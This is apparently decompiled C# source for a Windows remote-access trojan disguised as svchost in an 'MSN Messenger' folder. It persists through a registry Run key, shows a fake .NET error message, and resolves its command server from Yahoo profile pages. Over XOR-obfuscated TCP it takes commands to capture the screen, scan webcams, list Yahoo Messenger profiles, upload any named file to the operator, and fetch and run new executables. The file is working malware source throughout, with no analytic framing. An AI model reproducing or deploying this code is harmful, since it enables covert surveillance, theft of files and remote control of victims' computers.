using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace svchost;

public class Form1 : Form
{
	private IContainer components;

	public const int Version = 123;

	private const int ConnectPort = 32500;

	public const int CapPort = 32501;

	public const int CommandPort = 32510;

	public const int ComsCapPort = 32511;

	public const int UploadPort = 32512;

	public const int PreviewPort = 32513;

	public const int SearchPort = 32514;

	public const int UpdatePort = 32515;

	public const int WebCamPort = 32516;

	public const int WebCamImgPort = 32517;

	private const int PingTime = 180;

	public static string System32 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\";

	public static string UserDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";

	public static string ProgramDir = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\MSN Messenger\\";

	private TcpClient CommandClient;

	private NetworkStream CommandStream;

	private byte[] BytesToRead;

	private byte[] SendBytes;

	private int ByteCount;

	private bool YMSGsentflag;

	public const char SOH = '\u0001';

	public const char STX = '\u0002';

	public const char ETX = '\u0003';

	public const char EOT = '\u0004';

	public static string ServerIP = "";

	public static string ClientID = "";

	private int ct;

	public static string DataToSend;

	public static bool Connected;

	public static string MassiveCamList = "";

	private int[] Windows;

	private int WindowCount;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SETTEXT = 12;

	private const int WM_GETTEXT = 13;

	private const int WM_GETTEXTLENGTH = 14;

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Closed((EventHandler)Form1_Closed);
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		Size autoScaleBaseSize = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(autoScaleBaseSize);
		autoScaleBaseSize = new Size(115, 26);
		((Form)this).set_ClientSize(autoScaleBaseSize);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowExA(int hwndParent, int hwndChildAfter, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClass, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

	private bool EnumChildProc(IntPtr hWnd, int lParam)
	{
		return false;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		InitialiseProg();
		while (true)
		{
			Connected = false;
			ConnectToServer();
			SendID();
			Connected = true;
			while (true)
			{
				try
				{
					string text = RxMessage();
					if (StringType.StrCmp(text, ".Timeout.", false) == 0)
					{
						CommandStream.Close();
						CommandClient.Close();
						break;
					}
					if (text.StartsWith("\u0001") & text.EndsWith("\u0003"))
					{
						if (Strings.InStr(text, "\u0001.\u0003", (CompareMethod)0) != 0)
						{
							text = text.Replace("\u0001.\u0003", "");
							Sendmessage(".");
						}
						if (StringType.StrCmp(text, "", false) != 0)
						{
							text = text.Replace("\u0001", "");
							text = text.Replace("\u0003", "");
							if (text.StartsWith("Comms\u0002"))
							{
								CommsClass commsClass = new CommsClass();
								Thread thread = new Thread(commsClass.Go);
								thread.IsBackground = true;
								thread.Start();
							}
							if (text.StartsWith("ChckYMSG\u0002") && !File.Exists(System32 + "\\YMSG12ENCRYPT.dll"))
							{
								Sendmessage("ReqYMSGdll");
							}
							if (text.StartsWith("Ren\u0002"))
							{
								try
								{
									text = text.Replace("Ren\u0002", "");
									StreamWriter streamWriter = new StreamWriter(ProgramDir + "nm.dat", append: false);
									streamWriter.WriteLine(text);
									streamWriter.Close();
									ClientID = text;
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
								}
								SendID();
							}
							if (text.StartsWith("End\u0002"))
							{
								CommandStream.Close();
								CommandClient.Close();
								ProjectData.EndApp();
							}
							if (text.StartsWith("Update\u0002"))
							{
								text = text.Replace("Update\u0002", "");
								UpdateClient(text);
							}
							if (text.StartsWith("ScreenPreview\u0002"))
							{
								Sendmessage("ScreenPreview\u0002");
								ScreenCap screenCap = new ScreenCap();
								screenCap.ServerIp = ServerIP;
								Thread thread2 = new Thread(screenCap.ScreenCap);
								thread2.IsBackground = true;
								thread2.Start();
							}
							if (text.StartsWith("Cx\u0002"))
							{
								text = text.Replace("Cx\u0002", "");
								CamScan camScan = new CamScan();
								camScan.ScanData = text;
								camScan.From = "CamScan";
								Thread thread3 = new Thread(camScan.Go);
								thread3.IsBackground = true;
								thread3.Start();
							}
							if (text.StartsWith("GroupSearch\u0002"))
							{
								text = text.Replace("GroupSearch\u0002", "");
								GroupSearch groupSearch = new GroupSearch();
								GroupSearch.Params = text;
								Thread thread4 = new Thread(groupSearch.Go);
								thread4.IsBackground = true;
								thread4.Start();
							}
							if (text.StartsWith("Ynames\u0002"))
							{
								string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\yahoo!\\messenger\\profiles";
								if (Directory.Exists(path))
								{
									string text2 = "";
									string[] directories = Directory.GetDirectories(path);
									foreach (string text3 in directories)
									{
										text2 = text2 + text3.Substring(Strings.InStrRev(text3, "\\", -1, (CompareMethod)0)) + ",";
									}
									Sendmessage("Cyn\u0002" + text2);
								}
							}
							if (text.StartsWith("Download\u0002"))
							{
								text = text.Replace("Download\u0002", "");
								if (File.Exists(text))
								{
									try
									{
										new FileStream(text, FileMode.Open, FileAccess.Read);
									}
									catch (Exception projectError2)
									{
										ProjectData.SetProjectError(projectError2);
										Sendmessage("info:DownloadError ");
										ProjectData.ClearProjectError();
										return;
									}
									FileInfo fileInfo = new FileInfo(text);
									Sendmessage("DoDownload\u0002" + text + "\u0002" + fileInfo.Length);
									Uploader uploader = new Uploader();
									Uploader.File = text;
									Thread thread5 = new Thread(uploader.Upload);
									thread5.IsBackground = true;
									thread5.Start();
								}
							}
						}
					}
					goto IL_0405;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					goto IL_0405;
				}
				IL_0405:
				Application.DoEvents();
				Thread.Sleep(10);
			}
		}
	}

	public string RxMessage()
	{
		checked
		{
			string text2 = default(string);
			try
			{
				DateTime t = DateAndTime.get_Now().AddSeconds(180.0);
				string text = default(string);
				while (true)
				{
					if (CommandStream.DataAvailable)
					{
						t = DateAndTime.get_Now().AddSeconds(180.0);
						ByteCount = CommandStream.Read(BytesToRead, 0, CommandClient.ReceiveBufferSize);
						text += Encoding.Default.GetString(BytesToRead, 0, ByteCount);
						if (Strings.Chr(Strings.Asc(text.Substring(text.Length - 1, 1)) ^ 0xFF) == '\u0003')
						{
							int num = text.Length - 1;
							for (ct = 0; ct <= num; ct++)
							{
								text2 += StringType.FromChar(Strings.Chr(Strings.Asc(text.Substring(ct, 1)) ^ 0xFF));
							}
							break;
						}
					}
					Thread.Sleep(5);
					Application.DoEvents();
					if (StringType.StrCmp(DataToSend, "", false) != 0)
					{
						Sendmessage(DataToSend);
						DataToSend = "";
					}
					if (DateTime.Compare(DateAndTime.get_Now(), t) > 0)
					{
						text2 = ".Timeout.";
						return text2;
					}
				}
				return text2;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return text2;
			}
		}
	}

	public void Sendmessage(string Message)
	{
		checked
		{
			try
			{
				Message = "\u0001" + Message + "\u0003";
				int num = Message.Length - 1;
				string text = default(string);
				for (int i = 0; i <= num; i++)
				{
					text += StringType.FromChar(Strings.Chr(Strings.Asc(Message.Substring(i, 1)) ^ 0xFF));
				}
				SendBytes = Encoding.Default.GetBytes(text);
				CommandStream.Write(SendBytes, 0, SendBytes.Length);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Form1_Closed(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}

	public void ConnectToServer()
	{
		CommandClient = new TcpClient();
		CommandClient.NoDelay = true;
		checked
		{
			while (true)
			{
				try
				{
					GetServerIP();
					if (StringType.StrCmp(ServerIP, "", false) != 0)
					{
						DateTime t = DateAndTime.get_Now().AddMinutes(10.0);
						while (true)
						{
							try
							{
								CommandClient.Connect(ServerIP, 32500);
								CommandStream = CommandClient.GetStream();
								BytesToRead = new byte[CommandClient.ReceiveBufferSize + 1];
								return;
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								if (DateTime.Compare(DateAndTime.get_Now(), t) > 0)
								{
									ProjectData.ClearProjectError();
									break;
								}
								int num = (int)Math.Round(Conversion.Int(59f * VBMath.Rnd() + 1f));
								DateTime t2 = DateAndTime.get_Now().AddSeconds(num);
								do
								{
									Application.DoEvents();
									Thread.Sleep(100);
								}
								while (DateTime.Compare(DateAndTime.get_Now(), t2) <= 0);
								ProjectData.ClearProjectError();
								continue;
							}
						}
					}
					ServerIP = "";
					GetServerIP2();
					if (StringType.StrCmp(ServerIP, "", false) != 0)
					{
						try
						{
							CommandClient.Connect(ServerIP, 32500);
							CommandStream = CommandClient.GetStream();
							BytesToRead = new byte[CommandClient.ReceiveBufferSize + 1];
							break;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					DateTime t3 = DateAndTime.get_Now().AddMinutes(30.0);
					do
					{
						Application.DoEvents();
						Thread.Sleep(100);
					}
					while (DateTime.Compare(DateAndTime.get_Now(), t3) <= 0);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.EndApp();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void UpdateClient(string UpdateLength)
	{
		try
		{
			FileStream fileStream;
			try
			{
				fileStream = new FileStream(UserDir + "temp.exe", FileMode.Create, FileAccess.Write);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Sendmessage("info:Access Denied");
				ProjectData.ClearProjectError();
				return;
			}
			Sendmessage("ReadyForUpdate");
			DateTime t = DateAndTime.get_Now().AddMinutes(2.0);
			DateTime t2 = DateAndTime.get_Now().AddSeconds(10.0);
			try
			{
				long num2 = default(long);
				while (true)
				{
					if (CommandStream.DataAvailable)
					{
						int num = CommandStream.Read(BytesToRead, 0, CommandClient.ReceiveBufferSize);
						fileStream.Write(BytesToRead, 0, num);
						num2 = checked(num2 + num);
						if (StringType.StrCmp(num2.ToString(), UpdateLength, false) == 0)
						{
							break;
						}
					}
					if (DateTime.Compare(DateAndTime.get_Now(), t) <= 0)
					{
						if (DateTime.Compare(DateAndTime.get_Now(), t2) > 0)
						{
							Sendmessage(".");
							t2 = DateAndTime.get_Now().AddSeconds(10.0);
						}
						Application.DoEvents();
						Thread.Sleep(1);
						continue;
					}
					Sendmessage("info:Update Timed Out");
					fileStream.Close();
					return;
				}
				fileStream.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Sendmessage("info:Update Failed");
				fileStream.Close();
				ProjectData.ClearProjectError();
				return;
			}
			Sendmessage("info:Update Completed");
			fileStream.Close();
			DateTime t3 = DateAndTime.get_Now().AddSeconds(5.0);
			do
			{
				Thread.Sleep(10);
				Application.DoEvents();
			}
			while (DateTime.Compare(DateAndTime.get_Now(), t3) <= 0);
			Process process = new Process();
			process.StartInfo.FileName = UserDir + "temp.exe";
			process.Start();
			CommandStream.Close();
			CommandClient.Close();
			Thread.Sleep(10);
			Application.DoEvents();
			ProjectData.EndApp();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			Sendmessage("info:Update Failed");
			ProjectData.ClearProjectError();
		}
	}

	public void SendID()
	{
		try
		{
			try
			{
				StreamReader streamReader = new StreamReader(ProgramDir + "nm.dat");
				ClientID = streamReader.ReadLine();
				streamReader.Close();
				if (StringType.StrCmp(ClientID, "", false) == 0)
				{
					ClientID = "NoName";
				}
				Sendmessage(ClientID + "\u0002" + Environment.UserName.ToString() + "\u0002" + 123 + "\u0002" + Environment.GetCommandLineArgs()[0].ToString());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Sendmessage("Error!\u0002" + Environment.UserName.ToString() + "\u0002" + 123 + "\u0002" + Environment.GetCommandLineArgs()[0].ToString());
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void InitialiseProg()
	{
		//IL_03e6: Unknown result type (might be due to invalid IL or missing references)
		DateTime t = DateAndTime.get_Now().AddSeconds(5.0);
		do
		{
			Thread.Sleep(100);
			Application.DoEvents();
		}
		while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0);
		checked
		{
			try
			{
				if (StringType.StrCmp(Environment.GetCommandLineArgs()[0], ProgramDir + "temp.exe", false) == 0)
				{
					try
					{
						RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", writable: true);
						string[] valueNames = registryKey.GetValueNames();
						int upperBound = valueNames.GetUpperBound(0);
						for (int i = 0; i <= upperBound; i++)
						{
							if (ObjectType.ObjTst(registryKey.GetValue(valueNames[i]), (object)("\"" + ProgramDir + "svchost.exe" + "\""), false) == 0)
							{
								registryKey.DeleteValue(valueNames[i], throwOnMissingValue: true);
							}
						}
						registryKey.SetValue("MShelp1", "\"" + ProgramDir + "svchost.exe" + "\"");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					Thread.Sleep(12000);
				}
				if (Environment.GetCommandLineArgs()[0].EndsWith("temp.exe"))
				{
					try
					{
						File.Copy(Environment.GetCommandLineArgs()[0], ProgramDir + "svchost.exe", overwrite: true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Copy(Environment.GetCommandLineArgs()[0], UserDir + "svchost.exe", overwrite: true);
						Thread.Sleep(2000);
						Application.DoEvents();
						Process process = new Process();
						process.StartInfo.FileName = UserDir + "svchost.exe";
						process.Start();
						Thread.Sleep(2000);
						Application.DoEvents();
						ProjectData.EndApp();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Process process2 = new Process();
						process2.StartInfo.FileName = ProgramDir + "svchost.exe";
						process2.Start();
						Application.DoEvents();
						ProjectData.EndApp();
						ProjectData.ClearProjectError();
					}
				}
				if (StringType.StrCmp(Environment.GetCommandLineArgs()[0], ProgramDir + "svchost.exe", false) == 0)
				{
					if (!File.Exists(UserDir + "svchost.exe"))
					{
						File.Copy(Environment.GetCommandLineArgs()[0], UserDir + "svchost.exe", overwrite: true);
					}
					t = DateAndTime.get_Now().AddSeconds(2.0);
					do
					{
						Thread.Sleep(100);
						Application.DoEvents();
					}
					while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0);
					Process process3 = new Process();
					process3.StartInfo.FileName = UserDir + "svchost.exe";
					process3.Start();
					Thread.Sleep(1000);
					Application.DoEvents();
					ProjectData.EndApp();
				}
				if (StringType.StrCmp(Environment.GetCommandLineArgs()[0], UserDir + "svchost.exe", false) == 0)
				{
					return;
				}
				try
				{
					RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", writable: true);
					bool flag = false;
					string[] valueNames2 = registryKey2.GetValueNames();
					int upperBound2 = valueNames2.GetUpperBound(0);
					for (int j = 0; j <= upperBound2; j++)
					{
						if (ObjectType.ObjTst(registryKey2.GetValue(valueNames2[j]), (object)("\"" + ProgramDir + "svchost.exe" + "\""), false) == 0)
						{
							flag = true;
						}
					}
					if (!flag)
					{
						registryKey2.SetValue("MShelp1", "\"" + ProgramDir + "svchost.exe" + "\"");
						if (!Directory.Exists(ProgramDir))
						{
							Directory.CreateDirectory(ProgramDir);
						}
						File.Copy(Environment.GetCommandLineArgs()[0], ProgramDir + "svchost.exe", overwrite: true);
						Thread.Sleep(2000);
						Process process4 = new Process();
						process4.StartInfo.FileName = ProgramDir + "svchost.exe";
						process4.Start();
						Thread.Sleep(1000);
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				Interaction.MsgBox((object)"This applcation needs the .Net framework from Microsoft. Check your automatic update settings are correctly configured", (MsgBoxStyle)0, (object)null);
				ProjectData.EndApp();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void GetServerIP()
	{
		TcpClient tcpClient = new TcpClient();
		checked
		{
			byte[] array = new byte[tcpClient.ReceiveBufferSize + 1];
			ServerIP = "";
			try
			{
				tcpClient.Connect("360.yahoo.com", 80);
				NetworkStream stream = tcpClient.GetStream();
				byte[] bytes = Encoding.Default.GetBytes("GET /zeberdie1 HTTP/1.0\r\n");
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.Default.GetBytes("Host: 360.yahoo.com\r\n");
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.Default.GetBytes("Connection: Keep-Alive\r\n");
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.Default.GetBytes("\r\n");
				stream.Write(bytes, 0, bytes.Length);
				DateTime t = DateAndTime.get_Now().AddSeconds(60.0);
				string text = default(string);
				do
				{
					if (stream.DataAvailable)
					{
						int length = stream.Read(array, 0, tcpClient.ReceiveBufferSize);
						string @string = Encoding.Default.GetString(array);
						text += @string.Substring(0, length);
						if (Strings.InStr(text, "</html>", (CompareMethod)0) != 0)
						{
							break;
						}
					}
					Thread.Sleep(10);
					Application.DoEvents();
				}
				while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0);
				if (Strings.InStr(text, "yourip", (CompareMethod)0) != 0)
				{
					ServerIP = text.Substring(Strings.InStr(text, "yourip", (CompareMethod)0) + 5);
					ServerIP = ServerIP.Substring(0, Strings.InStr(ServerIP, "\"", (CompareMethod)0) - 1);
					int num = (int)Math.Round(Conversion.Val(ServerIP.Substring(0, Strings.InStr(ServerIP, ".", (CompareMethod)0))));
					num++;
					if (num > 255)
					{
						num = 0;
					}
					ServerIP = Strings.Format((object)num, "") + ServerIP.Substring(Strings.InStr(ServerIP, ".", (CompareMethod)0) - 1);
				}
				if (Strings.InStr(text, "yourix", (CompareMethod)0) != 0)
				{
					ServerIP = text.Substring(Strings.InStr(text, "yourix", (CompareMethod)0) + 5);
					ServerIP = ServerIP.Substring(0, Strings.InStr(ServerIP, "x", (CompareMethod)0) - 1);
					int num2 = (int)Math.Round(Conversion.Val(ServerIP.Substring(0, Strings.InStr(ServerIP, ".", (CompareMethod)0))));
					num2++;
					if (num2 > 255)
					{
						num2 = 0;
					}
					ServerIP = Strings.Format((object)num2, "") + ServerIP.Substring(Strings.InStr(ServerIP, ".", (CompareMethod)0) - 1);
				}
				string[] array2 = Strings.Split(ServerIP, ".", -1, (CompareMethod)0);
				if (array2.Length != 4)
				{
					ServerIP = "";
				}
				IPAddress.Parse(ServerIP);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ServerIP = "";
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void GetServerIP2()
	{
		TcpClient tcpClient = new TcpClient();
		checked
		{
			byte[] array = new byte[tcpClient.ReceiveBufferSize + 1];
			ServerIP = "";
			try
			{
				tcpClient.Connect("profiles.yahoo.com", 80);
				NetworkStream stream = tcpClient.GetStream();
				byte[] bytes = Encoding.Default.GetBytes("GET /couchfrog2003 HTTP/1.0\r\n");
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.Default.GetBytes("Host: profiles.yahoo.com\r\n");
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.Default.GetBytes("Connection: Keep-Alive\r\n");
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.Default.GetBytes("\r\n");
				stream.Write(bytes, 0, bytes.Length);
				DateTime t = DateAndTime.get_Now().AddSeconds(60.0);
				string text = default(string);
				do
				{
					if (stream.DataAvailable)
					{
						int length = stream.Read(array, 0, tcpClient.ReceiveBufferSize);
						string @string = Encoding.Default.GetString(array);
						text += @string.Substring(0, length);
						if (Strings.InStr(text, "</html>", (CompareMethod)0) != 0)
						{
							break;
						}
					}
					Thread.Sleep(10);
					Application.DoEvents();
				}
				while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0);
				if (Strings.InStr(text, "yourip", (CompareMethod)0) != 0)
				{
					ServerIP = text.Substring(Strings.InStr(text, "yourip", (CompareMethod)0) + 5);
					ServerIP = ServerIP.Substring(0, Strings.InStr(ServerIP, "\"", (CompareMethod)0) - 1);
					int num = (int)Math.Round(Conversion.Val(ServerIP.Substring(0, Strings.InStr(ServerIP, ".", (CompareMethod)0))));
					num++;
					if (num > 255)
					{
						num = 0;
					}
					ServerIP = Strings.Format((object)num, "") + ServerIP.Substring(Strings.InStr(ServerIP, ".", (CompareMethod)0) - 1);
				}
				if (Strings.InStr(text, "yourix", (CompareMethod)0) != 0)
				{
					ServerIP = text.Substring(Strings.InStr(text, "yourix", (CompareMethod)0) + 5);
					ServerIP = ServerIP.Substring(0, Strings.InStr(ServerIP, "x", (CompareMethod)0) - 1);
					int num2 = (int)Math.Round(Conversion.Val(ServerIP.Substring(0, Strings.InStr(ServerIP, ".", (CompareMethod)0))));
					num2++;
					if (num2 > 255)
					{
						num2 = 0;
					}
					ServerIP = Strings.Format((object)num2, "") + ServerIP.Substring(Strings.InStr(ServerIP, ".", (CompareMethod)0) - 1);
				}
				string[] array2 = Strings.Split(ServerIP, ".", -1, (CompareMethod)0);
				if (array2.Length != 4)
				{
					ServerIP = "";
				}
				IPAddress.Parse(ServerIP);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ServerIP = "";
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
